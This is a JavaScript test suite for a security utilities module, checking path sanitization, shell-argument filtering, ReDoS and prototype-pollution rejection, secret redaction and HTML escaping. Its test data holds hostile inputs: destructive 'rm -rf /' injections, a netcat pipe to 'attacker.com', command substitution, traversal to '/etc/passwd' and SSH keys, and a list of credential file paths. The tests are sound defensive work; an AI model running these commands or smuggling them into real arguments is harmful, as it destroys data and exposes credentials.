/**
 * Security Utilities Test Suite
 * Tests for security.js module functions
 */

import { describe, it } from 'node:test';
import assert from 'node:assert';
import {
  sanitizePath,
  sanitizePattern,
  sanitizeArgument,
  validateEnvVarName,
  sanitizeErrorMessage,
  isFileSizeValid,
  isDepthValid,
  RateLimiter,
  withTimeout,
  validateConfiguration,
  escapeForDisplay,
  isSafePath,
  MAX_FILE_SIZE,
  MAX_PATTERN_LENGTH,
  MAX_PATH_LENGTH
} from '../src/security.js';

describe('Security Utilities', () => {
  describe('sanitizePath', () => {
    it('should allow safe paths', () => {
      const safePaths = [
        'test/file.js',
        './src/index.js',
        'package.json'
      ];

      safePaths.forEach(safePath => {
        assert.doesNotThrow(() => sanitizePath(safePath));
      });
    });

    it('should reject paths with null bytes', () => {
      assert.throws(
        () => sanitizePath('test\x00.js'),
        /null bytes/
      );
    });

    it('should reject paths that are too long', () => {
      const longPath = 'a/'.repeat(3000);
      assert.throws(
        () => sanitizePath(longPath),
        /too long/
      );
    });

    it('should reject directory traversal attempts', () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '../../.ssh/id_rsa',
        './../../sensitive'
      ];

      traversalPaths.forEach(malPath => {
        assert.throws(
          () => sanitizePath(malPath),
          /traversal/
        );
      });
    });

    it('should reject invalid path types', () => {
      assert.throws(() => sanitizePath(null), /Invalid file path/);
      assert.throws(() => sanitizePath(undefined), /Invalid file path/);
      assert.throws(() => sanitizePath(123), /Invalid file path/);
    });
  });

  describe('sanitizePattern', () => {
    it('should allow safe patterns', () => {
      const safePatterns = [
        '*.js',
        '**/*.ts',
        'test/**',
        'src/[abc].js'
      ];

      safePatterns.forEach(pattern => {
        assert.doesNotThrow(() => sanitizePattern(pattern));
      });
    });

    it('should reject patterns with null bytes', () => {
      assert.throws(
        () => sanitizePattern('test\x00*.js'),
        /null bytes/
      );
    });

    it('should reject patterns that are too long', () => {
      const longPattern = '*'.repeat(2000);
      assert.throws(
        () => sanitizePattern(longPattern),
        /too long/
      );
    });

    it('should reject patterns with shell metacharacters', () => {
      const dangerousPatterns = [
        '*.js; rm -rf /',
        '*.js && cat /etc/passwd',
        '*.js | nc attacker.com',
        '*.js`whoami`',
        '*.js$(whoami)'
      ];

      dangerousPatterns.forEach(pattern => {
        assert.throws(
          () => sanitizePattern(pattern),
          /dangerous characters/
        );
      });
    });

    it('should reject potential ReDoS patterns', () => {
      const redosPatterns = [
        '(a+)+',
        '(a*)*',
        '(a|b)+'
      ];

      redosPatterns.forEach(pattern => {
        assert.throws(
          () => sanitizePattern(pattern),
          /ReDoS/
        );
      });
    });

    it('should reject invalid pattern types', () => {
      assert.throws(() => sanitizePattern(null), /Invalid pattern/);
      assert.throws(() => sanitizePattern(''), /Invalid pattern/);
    });
  });

  describe('sanitizeArgument', () => {
    it('should allow safe arguments', () => {
      const safeArgs = [
        'test.js',
        '--format=json',
        './src'
      ];

      safeArgs.forEach(arg => {
        assert.doesNotThrow(() => sanitizeArgument(arg));
      });
    });

    it('should reject arguments with null bytes', () => {
      assert.throws(
        () => sanitizeArgument('test\x00'),
        /null bytes/
      );
    });

    it('should reject arguments with shell metacharacters', () => {
      const dangerousArgs = [
        'test; rm -rf /',
        'test && whoami',
        'test | nc',
        'test`whoami`',
        'test$(whoami)',
        'test<file',
        'test>file'
      ];

      dangerousArgs.forEach(arg => {
        assert.throws(
          () => sanitizeArgument(arg),
          /shell metacharacters/
        );
      });
    });

    it('should reject arguments with newlines', () => {
      assert.throws(
        () => sanitizeArgument('test\nrm -rf /'),
        /newline/
      );
      assert.throws(
        () => sanitizeArgument('test\r\nrm -rf /'),
        /newline/
      );
    });

    it('should reject invalid argument types', () => {
      assert.throws(() => sanitizeArgument(123), /Invalid argument type/);
      assert.throws(() => sanitizeArgument(null), /Invalid argument type/);
    });
  });

  describe('validateEnvVarName', () => {
    it('should accept valid environment variable names', () => {
      const validNames = [
        'API_KEY',
        'DATABASE_URL',
        '_PRIVATE',
        'VAR123',
        'VAR_123_ABC'
      ];

      validNames.forEach(name => {
        assert.strictEqual(validateEnvVarName(name), true);
      });
    });

    it('should reject invalid environment variable names', () => {
      const invalidNames = [
        '',
        '123INVALID',
        'invalid',
        'INVALID-NAME',
        'INVALID.NAME',
        'INVALID NAME',
        'A'.repeat(300) // Too long
      ];

      invalidNames.forEach(name => {
        assert.strictEqual(validateEnvVarName(name), false);
      });
    });

    it('should reject non-string types', () => {
      assert.strictEqual(validateEnvVarName(null), false);
      assert.strictEqual(validateEnvVarName(undefined), false);
      assert.strictEqual(validateEnvVarName(123), false);
    });
  });

  describe('sanitizeErrorMessage', () => {
    it('should sanitize error messages in non-verbose mode', () => {
      const error = new Error('Failed to read /home/user/.ssh/id_rsa');
      const sanitized = sanitizeErrorMessage(error, false);
      
      assert.ok(!sanitized.includes('/home/user'));
      assert.ok(sanitized.includes('[path]'));
    });

    it('should redact potential secrets', () => {
      const error = new Error('API key sk_test_fakekeyfortest123456789 failed');
      const sanitized = sanitizeErrorMessage(error, false);
      
      assert.ok(!sanitized.includes('sk_test_'));
      assert.ok(sanitized.includes('[redacted]'));
    });

    it('should limit message length', () => {
      const longMessage = 'Error: ' + 'a'.repeat(300);
      const error = new Error(longMessage);
      const sanitized = sanitizeErrorMessage(error, false);
      
      assert.ok(sanitized.length <= 204); // 200 + '...'
    });

    it('should preserve messages in verbose mode', () => {
      const error = new Error('Detailed error message');
      const sanitized = sanitizeErrorMessage(error, true);
      
      assert.strictEqual(sanitized, 'Detailed error message');
    });

    it('should handle null errors', () => {
      const sanitized = sanitizeErrorMessage(null);
      assert.strictEqual(sanitized, 'Unknown error');
    });
  });

  describe('isFileSizeValid', () => {
    it('should accept valid file sizes', () => {
      assert.strictEqual(isFileSizeValid(0), true);
      assert.strictEqual(isFileSizeValid(1024), true);
      assert.strictEqual(isFileSizeValid(MAX_FILE_SIZE), true);
    });

    it('should reject invalid file sizes', () => {
      assert.strictEqual(isFileSizeValid(-1), false);
      assert.strictEqual(isFileSizeValid(MAX_FILE_SIZE + 1), false);
      assert.strictEqual(isFileSizeValid('1024'), false);
      assert.strictEqual(isFileSizeValid(null), false);
    });
  });

  describe('isDepthValid', () => {
    it('should accept shallow paths', () => {
      assert.strictEqual(isDepthValid('test/file.js'), true);
      assert.strictEqual(isDepthValid('src/utils/helper.js'), true);
    });

    it('should reject extremely deep paths', () => {
      const deepPath = 'a/'.repeat(150) + 'file.js';
      assert.strictEqual(isDepthValid(deepPath), false);
    });
  });

  describe('RateLimiter', () => {
    it('should allow operations under limit', () => {
      const limiter = new RateLimiter(10, 1000);
      
      for (let i = 0; i < 10; i++) {
        assert.strictEqual(limiter.allowOperation(), true);
      }
    });

    it('should block operations over limit', () => {
      const limiter = new RateLimiter(5, 1000);
      
      for (let i = 0; i < 5; i++) {
        limiter.allowOperation();
      }
      
      assert.strictEqual(limiter.allowOperation(), false);
    });

    it('should reset after time window', async () => {
      const limiter = new RateLimiter(2, 100);
      
      limiter.allowOperation();
      limiter.allowOperation();
      assert.strictEqual(limiter.allowOperation(), false);
      
      // Wait for window to pass
      await new Promise(resolve => setTimeout(resolve, 150));
      
      assert.strictEqual(limiter.allowOperation(), true);
    });

    it('should reset manually', () => {
      const limiter = new RateLimiter(2, 1000);
      
      limiter.allowOperation();
      limiter.allowOperation();
      assert.strictEqual(limiter.allowOperation(), false);
      
      limiter.reset();
      assert.strictEqual(limiter.allowOperation(), true);
    });
  });

  describe('withTimeout', () => {
    it('should resolve fast promises', async () => {
      const promise = Promise.resolve('success');
      const result = await withTimeout(promise, 1000);
      
      assert.strictEqual(result, 'success');
    });

    it('should timeout slow promises', async () => {
      const slowPromise = new Promise(resolve => setTimeout(resolve, 2000));
      
      await assert.rejects(
        withTimeout(slowPromise, 100),
        /timed out/
      );
    });

    it('should propagate rejections', async () => {
      const rejectPromise = Promise.reject(new Error('failed'));
      
      await assert.rejects(
        withTimeout(rejectPromise, 1000),
        /failed/
      );
    });
  });

  describe('validateConfiguration', () => {
    it('should accept valid configurations', () => {
      const validConfigs = [
        { path: '.', format: 'json' },
        { envFile: '.env.example', failOn: 'missing' },
        { ignore: ['node_modules/**'], noColor: true }
      ];

      validConfigs.forEach(config => {
        assert.doesNotThrow(() => validateConfiguration(config));
      });
    });

    it('should reject prototype pollution attempts', () => {
      const maliciousConfigs = [
        { __proto__: { polluted: true } },
        { constructor: { prototype: { polluted: true } } },
        { prototype: { polluted: true } }
      ];

      maliciousConfigs.forEach(config => {
        assert.throws(
          () => validateConfiguration(config),
          /dangerous properties/
        );
      });
    });

    it('should validate property types', () => {
      assert.throws(
        () => validateConfiguration({ path: 123 }),
        /Invalid path/
      );
      
      assert.throws(
        () => validateConfiguration({ format: 'invalid' }),
        /Invalid format/
      );
      
      assert.throws(
        () => validateConfiguration({ ignore: 'not-array' }),
        /Invalid ignore/
      );
    });

    it('should filter invalid array elements', () => {
      const config = { ignore: ['valid', 123, 'also-valid', null] };
      const validated = validateConfiguration(config);
      
      assert.deepStrictEqual(validated.ignore, ['valid', 'also-valid']);
    });

    it('should convert boolean properties', () => {
      const config = { noColor: 'true', quiet: 1, watch: 0 };
      const validated = validateConfiguration(config);
      
      assert.strictEqual(validated.noColor, true);
      assert.strictEqual(validated.quiet, true);
      assert.strictEqual(validated.watch, false);
    });

    it('should reject null or non-object configs', () => {
      assert.throws(() => validateConfiguration(null), /Invalid configuration/);
      assert.throws(() => validateConfiguration('string'), /Invalid configuration/);
      assert.throws(() => validateConfiguration(123), /Invalid configuration/);
    });
  });

  describe('escapeForDisplay', () => {
    it('should escape HTML special characters', () => {
      const input = '<script>alert("XSS")</script>';
      const escaped = escapeForDisplay(input);
      
      assert.ok(!escaped.includes('<script>'));
      assert.ok(escaped.includes('&lt;'));
      assert.ok(escaped.includes('&gt;'));
    });

    it('should escape quotes', () => {
      const input = 'He said "hello" and \'goodbye\'';
      const escaped = escapeForDisplay(input);
      
      assert.ok(escaped.includes('&quot;'));
      assert.ok(escaped.includes('&#x27;'));
    });

    it('should handle non-string inputs', () => {
      assert.strictEqual(escapeForDisplay(null), '');
      assert.strictEqual(escapeForDisplay(undefined), '');
      assert.strictEqual(escapeForDisplay(123), '');
    });
  });

  describe('isSafePath', () => {
    it('should accept safe paths', () => {
      const safePaths = [
        'src/index.js',
        'test/file.js',
        'package.json',
        '.env.example'
      ];

      safePaths.forEach(safePath => {
        assert.strictEqual(isSafePath(safePath), true);
      });
    });

    it('should reject dangerous paths', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '/etc/shadow',
        '/root/.bashrc',
        '/sys/kernel',
        '/proc/self',
        'C:\\Windows\\System32',
        'C:\\Program Files',
        '.ssh/id_rsa',
        '.aws/credentials',
        '.env' // Actual env file
      ];

      dangerousPaths.forEach(dangerousPath => {
        assert.strictEqual(isSafePath(dangerousPath), false);
      });
    });

    it('should reject invalid path types', () => {
      assert.strictEqual(isSafePath(null), false);
      assert.strictEqual(isSafePath(undefined), false);
      assert.strictEqual(isSafePath(123), false);
    });
  });
});
